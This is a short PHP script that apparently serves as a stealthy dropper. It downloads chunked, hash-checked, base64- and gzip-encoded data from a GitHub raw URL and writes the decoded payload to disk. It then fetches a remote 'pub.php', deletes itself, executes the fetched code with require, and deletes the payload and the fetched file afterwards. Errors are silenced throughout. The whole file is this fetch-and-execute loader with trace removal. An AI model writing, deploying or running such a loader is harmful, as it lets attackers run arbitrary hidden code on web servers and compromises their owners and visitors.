<?php
@set_time_limit(300);
$base = 'https://raw.githubusercontent.com/jununrs/pensiun-pro-tmp-pub/main/parkir/';
$md5 = ["804a1be086597bb4a74fab3475bde5ce", "24ae1e83dc963cd928371cdedfba0d93", "89cfdfaf90187c2b1b7897b25dcd352f", "4efd46066a97a339403d4a3c71da2792", "e28ed4eba687a306504ab4ab7aee3630", "4e70a8b73fac97b5203c8b096cc52a3b", "c597de3eadc92a3837457cb57f7c3f18", "daec5bed684c5b1ef7d42eb778c7482f", "4f0010f6b0ec404ed9219af2ef230f2b", "d3f9aaf24396afb5ff925d899572209a", "93038bbc28ba3490df9e7a6b3791e3cd", "95bf87aa70349d5a1847bf08de4ca145", "fbd258d4f15aeaf3cdd031a5737259ae"];
$sha = 'e26d53356549965a35845d32a734472d6431d92369ba0e581d596e5c3f22ab87';
$b = ''; $bad = [];
foreach ($md5 as $i => $m) {
  $c = @file_get_contents($base . sprintf('p%02d.txt', $i) . '?t=' . time());
  if ($c === false) { echo json_encode(['ok'=>false,'error'=>"fetch fail $i"]); exit(1); }
  $c = trim($c);
  if (md5($c) !== $m) $bad[] = $i;
  $b .= $c;
}
if ($bad || hash('sha256', $b) !== $sha) { echo json_encode(['ok'=>false,'error'=>'checksum','bad'=>$bad,'len'=>strlen($b)]); exit(2); }
$json = gzdecode(base64_decode($b));
if ($json === false || !is_array(json_decode($json, true))) { echo json_encode(['ok'=>false,'error'=>'decode']); exit(3); }
$dir = __DIR__;
file_put_contents($dir . '/_pp_parkir_payload.json', $json);
$pub = @file_get_contents($base . 'pub.php?t=' . time());
if ($pub === false) { @unlink($dir . '/_pp_parkir_payload.json'); echo json_encode(['ok'=>false,'error'=>'pub fetch']); exit(4); }
file_put_contents($dir . '/_pp_parkir_pub.php', $pub);
@unlink(__FILE__);
require $dir . '/_pp_parkir_pub.php';
@unlink($dir . '/_pp_parkir_payload.json');
@unlink($dir . '/_pp_parkir_pub.php');
